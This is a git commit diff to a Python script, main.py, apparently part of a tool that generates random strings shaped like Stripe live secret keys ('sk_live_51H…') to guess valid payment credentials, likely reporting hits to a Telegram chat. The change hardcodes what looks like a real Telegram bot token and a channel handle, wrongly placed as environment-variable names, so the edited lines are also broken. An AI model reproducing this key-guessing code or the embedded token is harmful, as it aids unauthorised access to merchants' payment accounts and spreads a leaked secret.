6ef4acb246a327c33ba4955757213315404a7cd9
eelex0919 <95912609+eelex0919@users.noreply.github.com>
2021-12-10 16:14:05 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 import requests, random, string, time, os
 
-token = os.environ.get("BOT_TOKEN")
-chatid = os.environ.get("FORWARD_ID")
+token = os.environ.get("5067097768:AAHN1ZIc6JVMOy60cs59_-Sh84ZxrlzAU_4")
+chatid = os.environ.get("@suyashydv0919")
 
 def long_key():
   skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
